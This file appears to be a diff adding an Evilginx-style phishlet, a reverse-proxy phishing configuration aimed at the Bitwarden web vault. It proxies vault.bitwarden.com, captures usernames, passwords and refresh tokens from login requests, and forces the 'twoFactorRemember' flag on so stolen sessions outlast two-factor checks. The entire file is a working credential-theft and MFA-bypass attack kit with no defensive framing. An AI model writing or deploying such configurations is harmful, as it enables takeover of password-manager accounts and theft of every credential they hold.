@@ -1,0 +1,38 @@
+author: '@thehackerish'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'vault', orig_sub: 'vault', domain: 'bitwarden.com', session: true, is_landing: true}
+
+sub_filters: []
+
+auth_tokens: []
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'refresh_token'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/api/sync'
+
+force_post:
+  - path: '/identity/connect/token'
+    search:
+      - {key: 'twoFactorRemember', search: '.*'}
+    force:
+      - {key: 'twoFactorRemember', value: '1'}
+    type: 'post'
+
+login:
+  domain: 'vault.bitwarden.com'
+  path: '/'
